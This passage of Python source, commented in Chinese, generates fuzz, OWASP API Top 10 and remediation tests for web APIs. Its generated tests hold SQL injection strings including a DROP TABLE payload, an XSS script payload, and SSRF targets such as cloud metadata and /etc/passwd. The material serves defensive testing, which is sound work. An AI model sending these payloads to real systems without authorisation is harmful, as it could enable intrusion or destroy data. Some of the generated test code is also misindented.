                # The API should handle invalid input gracefully
                assert response.status_code != 500, f"API returned 500 on fuzzed input: {{params}} {{data}}"
                
            except requests.RequestException as e:
                # Log the exception but continue testing
                print(f"Request exception in fuzz test: {{e}}")
                continue
    """
        
        # 添加資料驅動的模糊測試
        if endpoints:
            # 選擇一個端點進行更詳細的測試
            endpoint = endpoints[0]
            path = endpoint.get('path', '/unknown')
            method = endpoint.get('method', 'GET') if 'method' in endpoint else endpoint.get('methods', ['GET'])[0]
            function = endpoint.get('function', 'unknown')
            
            test_code += f"""
@pytest.mark.parametrize("payload", [
    # Edge cases
    None,
    "",
    0,
    -1,
    9999999999,
    # Special strings
    "null",
    "undefined",
    "NaN",
    "Infinity",
    # SQL Injection attempts
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    # XSS attempts
    "<script>alert('XSS')</script>",
    # Buffer overflow attempts
    "A" * 1000,
    # JSON specific
    "{{}}",
    "[]",
    # Control characters
    "\\u0000\\u0001\\u0002\\u0003",
    # Unicode
    "你好世界",
    "🔥🚀💻"
])
def test_detailed_fuzz_{function}(self, payload):
    \"\"\"Detailed fuzzing of {function} endpoint with specific payloads.\"\"\"
    client = requests.Session()
    
    try:
        # Try payload in different parts of the request
        
        # 1. As query parameter
        params = {{"test": payload}}
        # Make the request
        if "{method}" == "GET":
            response = client.get(f"{{BASE_URL}}{path}", params=params)
        else:
            response = client.{method.lower()}(f"{{BASE_URL}}{path}", params=params)
        
        # Check response (should not be 500)
        assert response.status_code != 500, f"API returned 500 on query param: {{payload}}"
        
        # 2. As body data (for POST/PUT/PATCH)
        if "{method}" in ["POST", "PUT", "PATCH"]:
            data = {{"test": payload}}
            response = client.{method.lower()}(f"{{BASE_URL}}{path}", json=data)
            # Check response (should not be 500)
            assert response.status_code != 500, f"API returned 500 on body data: {{payload}}"
        
    except requests.RequestException as e:
        # Log the exception but don't fail the test
        print(f"Request exception with payload {{payload}}: {{e}}")
"""
        
        # 添加運行說明
        test_code += """
# Instructions to run these tests:
# 1. Make sure your API server is running at BASE_URL
# 2. Run pytest with the fuzz mark: pytest -m fuzz
# 3. For more verbosity: pytest -m fuzz -v
# 4. To see print outputs: pytest -m fuzz -v -s

# Note: Fuzzing can potentially trigger bugs or unusual behavior in your API.
# Always run fuzz tests in a controlled environment, never in production.
"""
        
        return test_code

    def _generate_owasp_tests(self, file_path: str, endpoints: List[Dict[str, Any]], auth_info: Dict[str, Any]) -> Dict[str, Any]:
        """生成 OWASP API Security Top 10 測試"""
        if self.llm_client:
            try:
                # 獲取 OWASP 測試生成提示模板
                template = get_template('owasp_api_test_generation')
                
                # 如果模板不可用，使用默認提示
                if not template:
                    template = """
                    為以下 API 端點生成基於 OWASP API Security Top 10 的測試：
                    
                    文件路徑: {file_path}
                    
                    檢測到的端點:
                    {endpoints}
                    
                    認證信息:
                    {auth_info}
                    
                    請生成 Pytest 測試，涵蓋 OWASP API Security Top 10 (2023版本) 中的安全問題：
                    1. 損壞的物件級別授權 (BOLA)
                    2. 損壞的使用者認證 
                    3. 損壞的物件屬性級別授權 (BOPLA)
                    4. 缺乏資源限制
                    5. 損壞的功能級別授權 (BFLA) 
                    6. 伺服器端請求偽造 (SSRF)
                    7. 安全配置錯誤
                    8. 錯誤處理不當導致的資訊洩漏
                    9. 安全日誌記錄和監控不足
                    10. 業務邏輯漏洞
                    
                    請包括：
                    1. 必要的導入
                    2. 測試夾具和設置
                    3. 針對每個適用的 OWASP 問題的具體測試
                    4. 清晰的測試函數名稱和文檔
                    5. 有意義的斷言和錯誤處理
                    
                    Python 代碼：
                    ```python
                    # 完整的 OWASP 測試代碼
                    ```
                    """
                
                # 格式化端點以輸入到提示中
                endpoints_formatted = "\n".join([
                    f"- Path: {e.get('path', 'unknown')}, Method: {e.get('method', 'UNKNOWN') if 'method' in e else e.get('methods', ['UNKNOWN'])[0]}, Function: {e.get('function', 'unknown')}" 
                    for e in endpoints
                ])
                
                # 格式化認證信息
                auth_info_formatted = json.dumps(auth_info, indent=2)
                
                prompt = template.format(
                    file_path=file_path,
                    endpoints=endpoints_formatted,
                    auth_info=auth_info_formatted
                )
                
                # 請求 LLM 生成測試
                llm_response = self.llm_client.get_completion(prompt)
                
                # 提取代碼塊
                code_match = re.search(r'```python\s*(.*?)\s*```', llm_response, re.DOTALL)
                if code_match:
                    test_code = code_match.group(1)
                else:
                    test_code = llm_response
                
                # 確保我們有一個有效的 Python 文件
                if not test_code.strip().startswith('import') and not test_code.strip().startswith('from'):
                    test_code = f"# Generated OWASP API Security tests for {os.path.basename(file_path)}\n\n{test_code}"
                
                return {
                    "test_code": test_code
                }
                
            except Exception as e:
                self.logger.error(f"生成 OWASP 測試時出錯: {str(e)}")
                return {
                    "test_code": self._generate_basic_owasp_tests(file_path, endpoints),
                    "error": str(e)
                }
        else:
            return {
                "test_code": self._generate_basic_owasp_tests(file_path, endpoints)
            }

    def _generate_basic_owasp_tests(self, file_path: str, endpoints: List[Dict[str, Any]]) -> str:
        """生成基本的 OWASP API Security Top 10 測試，無需 LLM"""
        base_name = os.path.basename(file_path).replace('.py', '')
        
        test_code = f"""# OWASP API Security Top 10 Tests for {base_name}
import pytest
import requests
import json
import time
import re
from urllib.parse import urljoin

# Define constants
BASE_URL = "http://localhost:8000/api"
ADMIN_CREDENTIALS = {{"username": "admin", "password": "admin_password"}}
USER_CREDENTIALS = {{"username": "user", "password": "user_password"}}

# Helper functions and fixtures
@pytest.fixture
def admin_client():
    \"\"\"Create a session with admin privileges.\"\"\"
    session = requests.Session()
    # Add code to authenticate as admin
    # session.post(urljoin(BASE_URL, "/login"), json=ADMIN_CREDENTIALS)
    return session

@pytest.fixture
def user_client():
    \"\"\"Create a session with regular user privileges.\"\"\"
    session = requests.Session()
    # Add code to authenticate as regular user
    # session.post(urljoin(BASE_URL, "/login"), json=USER_CREDENTIALS)
    return session

def create_resource(client, data):
    \"\"\"Helper to create a test resource.\"\"\"
    # Implement resource creation logic
    # response = client.post(urljoin(BASE_URL, "/resources"), json=data)
    # return response.json().get("id")
    return "test_id"  # Placeholder

# OWASP API Security Top 10 (2023) Tests
"""
        
        # 為端點生成 OWASP 測試
        if not endpoints:
            # 如果沒有端點，生成通用測試
            test_code += """
class TestOWASPGeneric:
    \"\"\"Generic OWASP API Security tests not tied to specific endpoints.\"\"\"

# API1:2023 - Broken Object Level Authorization (BOLA)
def test_api1_bola(self, admin_client, user_client):
    \"\"\"Test for Broken Object Level Authorization.\"\"\"
    # Create a resource as admin
    resource_id = create_resource(admin_client, {"name": "Admin Resource"})
    
    # Try to access the resource as a different user
    response = user_client.get(urljoin(BASE_URL, f"/resources/{resource_id}"))
    
    # The user should not be able to access admin's resource
    assert response.status_code in [401, 403], "BOLA: User should not access admin's resource"

# API2:2023 - Broken Authentication
def test_api2_broken_authentication(self):
    \"\"\"Test for Broken Authentication.\"\"\"
    # Test authentication bypass
    # Try accessing a protected endpoint without authentication
    response = requests.get(urljoin(BASE_URL, "/protected_endpoint"))
    assert response.status_code in [401, 403], "Authentication should be required"
    
    # Test weak credentials
    weak_passwords = ["password", "123456", "admin", "qwerty"]
    for password in weak_passwords:
        response = requests.post(
            urljoin(BASE_URL, "/login"), 
            json={"username": "admin", "password": password}
        )
        # We're testing the endpoint's resistance to weak passwords
        # The test passes if we can't login with weak passwords
        assert response.status_code != 200, f"Weak password '{password}' should be rejected"

# API3:2023 - Broken Object Property Level Authorization (BOPLA)
def test_api3_bopla(self, admin_client, user_client):
    \"\"\"Test for Broken Object Property Level Authorization.\"\"\"
    # Create a resource with sensitive properties as admin
    resource_data = {
        "name": "Test Resource",
        "public_field": "Public Info",
        "sensitive_field": "Sensitive Info",
        "admin_only_field": "Admin Only"
    }
    resource_id = create_resource(admin_client, resource_data)
    
    # Retrieve the resource as a regular user
    response = user_client.get(urljoin(BASE_URL, f"/resources/{resource_id}"))
    
    # Check that sensitive fields are not included in the response
    if response.status_code == 200:
        resource = response.json()
        assert "sensitive_field" not in resource, "BOPLA: Sensitive field exposed to user"
        assert "admin_only_field" not in resource, "BOPLA: Admin-only field exposed to user"

# API4:2023 - Unrestricted Resource Consumption
def test_api4_resource_consumption(self):
    \"\"\"Test for Unrestricted Resource Consumption.\"\"\"
    # Test for rate limiting
    start_time = time.time()
    request_count = 0
    
    # Make multiple requests in a short time frame
    for _ in range(20):
        requests.get(urljoin(BASE_URL, "/any_endpoint"))
        request_count += 1
        
        # If we hit a rate limit, the test passes
        if time.time() - start_time > 5:  # Stop after 5 seconds
            break
    
    # We're looking for rate limiting in a production API
    # In a test environment, we might just log the result
    print(f"Made {request_count} requests in {time.time() - start_time:.2f} seconds")
    
    # Test for pagination limits
    response = requests.get(urljoin(BASE_URL, "/resources"), params={"limit": 1000000})
    if response.status_code == 200 and "json" in response.headers.get("Content-Type", ""):
        data = response.json()
        if isinstance(data, list):
            assert len(data) <= 1000, "API should limit the number of returned resources"

# API5:2023 - Broken Function Level Authorization (BFLA)
def test_api5_bfla(self, user_client):
    \"\"\"Test for Broken Function Level Authorization.\"\"\"
    # Try to access admin-only endpoints as a regular user
    admin_endpoints = [
        "/admin/users",
        "/admin/settings",
        "/admin/logs"
    ]
    
    for endpoint in admin_endpoints:
        response = user_client.get(urljoin(BASE_URL, endpoint))
        assert response.status_code in [401, 403, 404], f"BFLA: User shouldn't access {endpoint}"
    
    # Try to perform admin-only operations
    admin_operations = [
        {"method": "post", "endpoint": "/users", "data": {"username": "new_user"}},
        {"method": "delete", "endpoint": "/users/1"},
        {"method": "put", "endpoint": "/settings", "data": {"setting": "value"}}
    ]
    
    for op in admin_operations:
        if op["method"] == "post":
            response = user_client.post(urljoin(BASE_URL, op["endpoint"]), json=op.get("data", {}))
        elif op["method"] == "delete":
            response = user_client.delete(urljoin(BASE_URL, op["endpoint"]))
        elif op["method"] == "put":
            response = user_client.put(urljoin(BASE_URL, op["endpoint"]), json=op.get("data", {}))
            
        assert response.status_code in [401, 403, 404], f"BFLA: User shouldn't perform {op['method']} on {op['endpoint']}"

# API6:2023 - Server-Side Request Forgery (SSRF)
def test_api6_ssrf(self, admin_client):
    \"\"\"Test for Server-Side Request Forgery.\"\"\"
    # Test endpoints that might process URLs
    ssrf_targets = [
        "http://localhost:22",  # SSH
        "http://localhost:3306",  # MySQL
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://127.0.0.1/admin",  # Local admin interface
        "file:///etc/passwd"  # Local file
    ]
    
    # Endpoints that might be vulnerable to SSRF
    potentially_vulnerable_endpoints = [
        {"endpoint": "/fetch_url", "param": "url"},
        {"endpoint": "/import", "param": "source"},
        {"endpoint": "/profile", "param": "avatar_url"}
    ]
    
    for endpoint_info in potentially_vulnerable_endpoints:
        for target in ssrf_targets:
            response = admin_client.post(
                urljoin(BASE_URL, endpoint_info["endpoint"]),
                json={endpoint_info["param"]: target}
            )
            
            # API should reject or fail safely
            assert response.status_code != 200, f"SSRF: API should reject request to {target}"

# API7:2023 - Security Misconfiguration
def test_api7_security_misconfiguration(self):
    \"\"\"Test for Security Misconfiguration.\"\"\"
    # Check for sensitive headers
    response = requests.get(urljoin(BASE_URL, "/"))
    headers = response.headers
    
    sensitive_headers = [
        "Server",
        "X-Powered-By",
        "X-AspNet-Version",
        "X-Runtime"
    ]
    
    for header in sensitive_headers:
        if header.lower() in [h.lower() for h in headers]:
            print(f"Warning: Sensitive header {header} is exposed")
    
    # Check for CORS misconfiguration
    cors_response = requests.options(urljoin(BASE_URL, "/"), 
                                    headers={"Origin": "https://malicious-site.com"})
    
    allow_origin = cors_response.headers.get("Access-Control-Allow-Origin", "")
    if allow_origin == "*" or "malicious-site.com" in allow_origin:
        print("Warning: CORS might be misconfigured, allowing cross-origin requests from any domain")

# API8:2023 - Security Logging and Monitoring Failures
def test_api8_logging_monitoring(self, admin_client):
    \"\"\"Test for Security Logging and Monitoring Failures.\"\"\"
    # This is hard to test directly as it depends on server-side implementation
    # We can only try operations that should be logged and verify manually
    
    # Try login with invalid credentials
    requests.post(urljoin(BASE_URL, "/login"), 
                    json={"username": "admin", "password": "invalid_password"})
    
    # Try to access sensitive data
    admin_client.get(urljoin(BASE_URL, "/admin/logs"))
    
    # Try a suspicious operation
    admin_client.delete(urljoin(BASE_URL, "/users/1"))
    
    print("Note: Manual verification required to confirm these operations were properly logged")

# API9:2023 - Improper Inventory Management
def test_api9_inventory_management(self):
    \"\"\"Test for Improper Inventory Management.\"\"\"
    # Check for test/debug endpoints
    test_endpoints = [
        "/test",
        "/debug",
        "/dev",
        "/beta",
        "/admin",
        "/console",
        "/swagger",
        "/api-docs",
        "/graphql",
        "/.git"
    ]
    
    for endpoint in test_endpoints:
        response = requests.get(urljoin(BASE_URL, endpoint))
        if response.status_code < 400:
            print(f"Warning: Potentially exposed non-production endpoint: {endpoint}")

# API10:2023 - Unsafe Consumption of APIs
def test_api10_unsafe_consumption(self, admin_client):
    \"\"\"Test for Unsafe Consumption of APIs.\"\"\"
    # This typically involves testing how the API consumes other APIs
    # It's difficult to test without knowledge of the internal API consumption
    
    # We can test endpoints that might consume external data
    external_data_endpoints = [
        {"endpoint": "/fetch_external", "param": "external_api", "value": "https://api.example.com"},
        {"endpoint": "/webhooks", "param": "data", "value": {"id": "1", "malicious_field": "<script>alert('XSS')</script>"}}
    ]
    
    for endpoint_info in external_data_endpoints:
        response = admin_client.post(
            urljoin(BASE_URL, endpoint_info["endpoint"]),
            json={endpoint_info["param"]: endpoint_info["value"]}
        )
        
        # Just log the response, as we're looking for how it handles the data
        print(f"Response from {endpoint_info['endpoint']}: Status {response.status_code}")
"""
            
        else:
            # 為特定端點生成 OWASP 測試
            test_code += """
class TestOWASPEndpoints:
    \"\"\"OWASP API Security tests for specific API endpoints.\"\"\"
"""
            
            # 選擇適合的端點進行測試
            for endpoint in endpoints:
                path = endpoint.get('path', '/unknown')
                method = endpoint.get('method', 'GET') if 'method' in endpoint else endpoint.get('methods', ['GET'])[0]
                function = endpoint.get('function', 'unknown')
                
                # 只為特定類型的端點生成特定測試
                if '{id}' in path or '<id>' in path:
                    # Resource-specific endpoint, good for BOLA testing
                    resource_path = path.replace('{id}', '{resource_id}').replace('<id>', '{resource_id}')
                    
                    test_code += f"""
# API1:2023 - Broken Object Level Authorization (BOLA)
def test_api1_bola_{function}(self, admin_client, user_client):
    \"\"\"Test for Broken Object Level Authorization on {function}.\"\"\"
    # Create resources for both users
    admin_resource_id = create_resource(admin_client, {{"name": "Admin Resource"}})
    user_resource_id = create_resource(user_client, {{"name": "User Resource"}})
    
    # User tries to access admin's resource
    response = user_client.{method.lower()}(urljoin(BASE_URL, "{resource_path}".format(resource_id=admin_resource_id)))
    assert response.status_code in [401, 403], "BOLA: User should not access admin's resource"
    
    # Admin can access user's resource (this is expected behavior)
    response = admin_client.{method.lower()}(urljoin(BASE_URL, "{resource_path}".format(resource_id=user_resource_id)))
    assert response.status_code == 200, "Admin should be able to access user's resource"
"""
                
                if method in ['POST', 'PUT', 'PATCH']:
                    # Data modification endpoints, good for BOPLA testing
                    test_code += f"""
# API3:2023 - Broken Object Property Level Authorization (BOPLA)
def test_api3_bopla_{function}(self, admin_client, user_client):
    \"\"\"Test for Broken Object Property Level Authorization on {function}.\"\"\"
    # Create a resource
    resource_id = create_resource(admin_client, {{"name": "Test Resource"}})
    
    # User tries to update admin-only fields
    sensitive_update = {{
        "name": "Updated Name",
        "role": "admin",  # This should be an admin-only field
        "permissions": ["delete_all", "read_all"]  # These should be admin-only
    }}
    
    response = user_client.{method.lower()}(urljoin(BASE_URL, "{path}"), json=sensitive_update)
    
    # Either the request should be rejected, or the sensitive fields should be ignored
    if response.status_code == 200:
        # Check that the sensitive updates weren't applied
        get_response = user_client.get(urljoin(BASE_URL, "{path}"))
        if get_response.status_code == 200:
            resource = get_response.json()
            assert resource.get("role") != "admin", "BOPLA: User should not update role field"
            assert not set(["delete_all", "read_all"]).issubset(set(resource.get("permissions", []))), \
                "BOPLA: User should not update admin permissions"
"""
                
                if 'user' in path.lower() or 'account' in path.lower() or 'profile' in path.lower():
                    # User-related endpoints, good for authentication testing
                    test_code += f"""
# API2:2023 - Broken Authentication
def test_api2_broken_authentication_{function}(self):
    \"\"\"Test for Broken Authentication on {function}.\"\"\"
    # Test for session fixation
    session = requests.Session()
    
    # Get any existing session cookie
    session.get(urljoin(BASE_URL, "/"))
    pre_auth_cookies = session.cookies.get_dict()
    
    # Login
    session.post(urljoin(BASE_URL, "/login"), json=USER_CREDENTIALS)
    post_auth_cookies = session.cookies.get_dict()
    
    # Check if authentication resulted in new session cookies
    for name, value in pre_auth_cookies.items():
        if name in post_auth_cookies and "session" in name.lower():
            assert value != post_auth_cookies[name], \
                "Session fixation: Session ID should change after authentication"
"""
                
                # Resource-intensive operations or list endpoints
                if method == 'GET' and ('list' in function.lower() or 'all' in function.lower()):
                    test_code += f"""
# API4:2023 - Unrestricted Resource Consumption
def test_api4_resource_consumption_{function}(self):
    \"\"\"Test for Unrestricted Resource Consumption on {function}.\"\"\"
    # Test pagination limits
    
    # Try requesting extremely large page size
    response = requests.get(urljoin(BASE_URL, "{path}"), params={{"limit": 10000, "page": 1}})
    
    if response.status_code == 200 and "json" in response.headers.get("Content-Type", ""):
        data = response.json()
        if isinstance(data, list):
            assert len(data) <= 1000, "API should limit the number of returned resources"
        elif isinstance(data, dict) and "results" in data:
            assert len(data["results"]) <= 1000, "API should limit the number of returned resources"
"""
        
        # 添加運行說明
        test_code += """
# Run these tests with:
# pytest owasp_api_security_tests.py -v

# Note: These tests provide a starting point for OWASP API Security testing.
# They should be customized based on your specific API implementation.
# Some tests might need to be run manually or require special setup.
"""
        
        return test_code

    def _get_risk_level(self, risk_score: float) -> str:
        """根據風險評分獲取風險級別"""
        if risk_score >= 7.0:
            return "高"
        elif risk_score >= 4.0:
            return "中"
        else:
            return "低"

    def _generate_security_improvements(self, file_path: str, summary: Dict[str, Any]) -> List[Dict[str, Any]]:
        """根據安全風險生成改進建議"""
        improvements = []
        risks = summary.get('security_risks', [])
        
        # 遍歷風險，生成相應的改進建議
        for risk in risks:
            category = risk.get('category', '').lower()
            improvement = {
                "category": risk.get('category', '未知'),
                "title": f"解決 {risk.get('title', '安全問題')}",
                "risk_severity": risk.get('severity', '低'),
                "implementation_complexity": "中",  # 默認值
                "description": "",
                "code_example": ""
            }
            
            # 根據風險類型提供特定建議
            if 'inject' in category or 'sql' in category:
                improvement["description"] = "使用參數化查詢或 ORM 來防止 SQL 注入攻擊。避免直接連接使用者輸入來構建 SQL 查詢。"
                improvement["code_example"] = """# 不好的做法
    cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

    # 好的做法 - 使用參數化查詢
    cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

    # 更好的做法 - 使用 ORM
    user = User.query.filter_by(username=username).first()
    """
                improvement["implementation_complexity"] = "低"
            
            elif 'input' in category or 'validat' in category:
                improvement["description"] = "實施嚴格的輸入驗證，包括類型檢查、長度限制和格式驗證。使用表單驗證庫或架構的驗證組件。"
                improvement["code_example"] = """# 使用 Pydantic 進行輸入驗證
    from pydantic import BaseModel, validator

    class UserInput(BaseModel):
    username: str
    email: str
    age: int

    @validator('username')
    def username_must_be_valid(cls, v):
        if len(v) < 3 or len(v) > 50:
            raise ValueError('用戶名必須介於 3 到 50 個字符之間')
        if not v.isalnum():
            raise ValueError('用戶名只能包含字母和數字')
        return v

    @validator('email')
    def email_must_be_valid(cls, v):
        # 簡單的電子郵件驗證
        if '@' not in v or '.' not in v:
            raise ValueError('無效的電子郵件格式')
        return v

    @validator('age')
    def age_must_be_valid(cls, v):
        if v < 0 or v > 120:
            raise ValueError('年齡必須介於 0 到 120 之間')
        return v

    # 在 API 端點中使用
    @app.post("/users")
    def create_user(user_input: UserInput):
    # 輸入已經被驗證
    db.add_user(user_input.dict())
    return {"status": "success"}
    """
                improvement["implementation_complexity"] = "中"
            
            elif 'auth' in category:
                improvement["description"] = "實施強大的認證機制，使用行業標準如 JWT 或 OAuth。避免硬編碼憑證，使用環境變數或安全的密鑰管理系統。確保所有認證都通過 HTTPS 進行。"
                improvement["code_example"] = """# 使用 Flask-JWT-Extended 進行認證
    from flask import Flask, jsonify, request
    from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity
    import os

    app = Flask(__name__)
    app.config['JWT_SECRET_KEY'] = os.environ.get('JWT_SECRET_KEY')  # 從環境變數中獲取
    jwt = JWTManager(app)

    @app.route('/login', methods=['POST'])
    def login():
    username = request.json.get('username', None)
    password = request.json.get('password', None)

    # 檢查使用者名稱和密碼
    # 在實際應用中，應對密碼進行哈希處理
    user = authenticate_user(username, password)
    if not user:
        return jsonify({"msg": "帳號或密碼錯誤"}), 401

    # 創建訪問令牌
    access_token = create_access_token(identity=username)
    return jsonify(access_token=access_token)

    @app.route('/protected', methods=['GET'])
    @jwt_required()
    def protected():
    # 訪問當前使用者身份
    current_user = get_jwt_identity()
    return jsonify(logged_in_as=current_user), 200
    """
                improvement["implementation_complexity"] = "中"
            
            elif 'csrf' in category:
                improvement["description"] = "為所有改變狀態的請求（特別是 POST、PUT、DELETE）實施 CSRF 保護。使用框架提供的 CSRF 保護機制或實現雙提交 cookie 模式。"
                improvement["code_example"] = """# 使用 Flask-WTF 進行 CSRF 保護
    from flask import Flask, render_template, request
    from flask_wtf.csrf import CSRFProtect
    from flask_wtf import FlaskForm

    app = Flask(__name__)
    app.config['SECRET_KEY'] = 'your-secret-key'
    csrf = CSRFProtect(app)

    @app.route('/form', methods=['GET', 'POST'])
    def form():
    if request.method == 'POST':
        # 表單已提交，處理數據
        # CSRF 令牌會自動驗證
        return 'Form submitted!'
    return render_template('form.html')  # 包含 CSRF 令牌的模板

    # 對於 API 端點，您可以使用
    @app.route('/api/resource', methods=['POST'])
    @csrf.exempt  # 如果需要，可以豁免某些端點
    def create_resource():
    # 處理 API 請求
    return {'status': 'success'}

    # 在前端，確保包含 CSRF 令牌
    # <form method="post">
    #   <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
    #   ...
    # </form>
    """
                improvement["implementation_complexity"] = "低"
            
            elif 'xss' in category:
                improvement["description"] = "實施適當的輸出編碼，避免直接渲染用戶提供的內容。使用安全的模板系統，並考慮實施內容安全策略（CSP）。"
                improvement["code_example"] = """# 在 Flask 中使用 Jinja2 模板的自動轉義功能
    from flask import Flask, render_template, request

    app = Flask(__name__)

    @app.route('/user/<username>')
    def user_profile(username):
    # Jinja2 會自動轉義 username
    return render_template('user.html', username=username)

    # 在模板中：
    # <p>Hello, {{ username }}</p>  <!-- 自動轉義 -->
    # <p>{{ description|safe }}</p>  <!-- 明確表示不轉義 -->

    # 添加內容安全策略
    @app.after_request
    def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return response
    """
                improvement["implementation_complexity"] = "低"
            
            elif 'log' in category or 'monitor' in category:
                improvement["description"] = "實施全面的安全日誌記錄，捕獲關鍵事件如身份驗證嘗試、授權決策和數據修改。使用結構化日誌格式，並考慮集中日誌管理系統。"
                improvement["code_example"] = """# 使用 Python 的 logging 模組進行安全日誌記錄
    import logging
    import json
    from datetime import datetime
    import uuid

    # 配置結構化日誌記錄
    logger = logging.getLogger("security")
    handler = logging.FileHandler("security.log")
    handler.setFormatter(logging.Formatter('%(message)s'))
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)

    def log_security_event(event_type, user_id=None, status="success", details=None):
    \"\"\"記錄安全事件\"\"\"
    event = {
        "timestamp": datetime.utcnow().isoformat(),
        "event_id": str(uuid.uuid4()),
        "event_type": event_type,
        "user_id": user_id,
        "status": status,
        "ip_address": request.remote_addr,
        "user_agent": request.user_agent.string,
        "details": details or {}
    }
    logger.info(json.dumps(event))

    # 在應用程式中使用
    @app.route('/login', methods=['POST'])
    def login():
    username = request.json.get('username')
    password = request.json.get('password')

    user = authenticate_user(username, password)
    if user:
        log_security_event("authentication", user_id=user.id, status="success")
        return jsonify({"status": "success"})
    else:
        log_security_event("authentication", status="failure", 
                            details={"username": username, "reason": "invalid_credentials"})
        return jsonify({"status": "error", "message": "Invalid credentials"}), 401
    """
                improvement["implementation_complexity"] = "中"
            
            elif 'access' in category or 'authorization' in category:
                improvement["description"] = "實施強大的訪問控制，確保在不同級別（物件、屬性、功能）進行適當的授權檢查。採用最小權限原則，並考慮實施基於角色的訪問控制（RBAC）。"
                improvement["code_example"] = """# 使用裝飾器實施訪問控制
    from functools import wraps
    from flask import g, request, abort

    def role_required(role):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not g.user:
                abort(401)  # 未認證
            if not g.user.has_role(role):
                abort(403)  # 未授權
            return f(*args, **kwargs)
        return decorated_function
    return decorator

    # 物件級別授權
    def owns_resource(resource_id):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not g.user:
                abort(401)
            
            resource = Resource.query.get(resource_id)
            if not resource:
                abort(404)
                
            if resource.owner_id != g.user.id and not g.user.has_role('admin'):
                abort(403)
                
            return f(*args, **kwargs)
        return decorated_function
    return decorator

    # 在 API 端點中使用
    @app.route('/admin/users', methods=['GET'])
    @role_required('admin')
    def list_all_users():
    users = User.query.all()
    return jsonify([user.to_dict() for user in users])

    @app.route('/resources/<int:resource_id>', methods=['PUT'])
    @owns_resource(lambda: request.view_args['resource_id'])
    def update_resource(resource_id):
    # 更新資源
    return jsonify({"status": "success"})
    """
                improvement["implementation_complexity"] = "高"
            
            else:
                # 通用改進建議
                improvement["description"] = f"解決檢測到的 {risk.get('title', '安全問題')}。遵循安全最佳實踐，如 OWASP API Security Top 10。"
                improvement["implementation_complexity"] = "中"
            
            improvements.append(improvement)
        
        # 添加常見安全最佳實踐（如果沒有足夠的具體建議）
        if len(improvements) < 3:
            # 添加一些通用建議
            general_improvements = [
                {
                    "category": "安全性配置",
                    "title": "啟用 HTTPS",
                    "risk_severity": "高",
                    "implementation_complexity": "低",
                    "description": "確保所有 API 通信都通過 HTTPS 進行，以保護數據傳輸安全。配置適當的 TLS 設置，禁用不安全的協議和密碼。",
                    "code_example": "# 在 Python Web 框架中強制 HTTPS\n# Flask 範例\n@app.before_request\ndef force_https():\n    if request.headers.get('X-Forwarded-Proto') == 'http':\n        url = request.url.replace('http://', 'https://', 1)\n        return redirect(url, code=301)"
                },
                {
                    "category": "API 安全",
                    "title": "實施速率限制",
                    "risk_severity": "中",
                    "implementation_complexity": "中",
                    "description": "實施 API 速率限制，以防止暴力攻擊、拒絕服務（DoS）攻擊和資源濫用。按 IP、用戶或 API 密鑰進行限制。",
                    "code_example": "# 使用 Flask-Limiter 實施速率限制\nfrom flask import Flask\nfrom flask_limiter import Limiter\nfrom flask_limiter.util import get_remote_address\n\napp = Flask(__name__)\nlimiter = Limiter(\n    app,\n    key_func=get_remote_address,\n    default_limits=[\"200 per day\", \"50 per hour\"]\n)\n\n@app.route('/login', methods=['POST'])\n@limiter.limit(\"5 per minute\")\ndef login():\n    # 登入邏輯\n    pass"
                },
                {
                    "category": "敏感數據",
                    "title": "保護敏感數據",
                    "risk_severity": "高",
                    "implementation_complexity": "中",
                    "description": "確保敏感數據得到適當保護，包括傳輸中和靜態數據。使用強加密，避免洩露敏感信息，並考慮數據最小化原則。",
                    "code_example": "# 使用 Python cryptography 庫加密敏感數據\nfrom cryptography.fernet import Fernet\n\n# 生成密鑰\nkey = Fernet.generate_key()\ncipher_suite = Fernet(key)\n\n# 加密數據\nsensitive_data = b\"敏感信息\"\ncipher_text = cipher_suite.encrypt(sensitive_data)\n\n# 解密數據\nplain_text = cipher_suite.decrypt(cipher_text)"
                }
            ]
            
            # 添加尚未包含的通用建議
            for improvement in general_improvements:
                if not any(imp["title"] == improvement["title"] for imp in improvements):
                    improvements.append(improvement)
                if len(improvements) >= 5:  # 最多添加到 5 個建議
                    break
        
        return improvements

    def _save_security_tests(self, file_path: str, result: Dict[str, Any]) -> str:
        """保存安全測試到文件"""
        try:
            # 獲取基本文件名
            base_name = os.path.basename(file_path).replace('.py', '')
            
            # 創建測試目錄
            tests_dir = os.path.join(self.output_dir, base_name)
            os.makedirs(tests_dir, exist_ok=True)
            
            # 保存安全測試
            security_test_path = os.path.join(tests_dir, f"test_{base_name}_security.py")
            write_file(security_test_path, result['security_tests'].get('test_code', ''))
            
            # 保存模糊測試
            fuzz_test_path = os.path.join(tests_dir, f"test_{base_name}_fuzz.py")
            write_file(fuzz_test_path, result['fuzz_tests'].get('test_code', ''))
            
            # 保存 OWASP 測試
            owasp_test_path = os.path.join(tests_dir, f"test_{base_name}_owasp.py")
            write_file(owasp_test_path, result['owasp_tests'].get('test_code', ''))
            
            # 保存測試摘要
            summary = {
                "file_analyzed": file_path,
                "endpoints_detected": result['detected_endpoints'],
                "security_risks": result['security_risks'],
                "test_files": {
                    "security_tests": security_test_path,
                    "fuzz_tests": fuzz_test_path,
                    "owasp_tests": owasp_test_path
                }
            }
            
            summary_path = os.path.join(tests_dir, "security_test_summary.json")
            with open(summary_path, 'w') as f:
                json.dump(summary, f, indent=2)
            
            self.logger.info(f"安全測試已保存到 {tests_dir}")
            return security_test_path
            
        except Exception as e:
            self.logger.error(f"保存安全測試時出錯: {str(e)}")
            return ""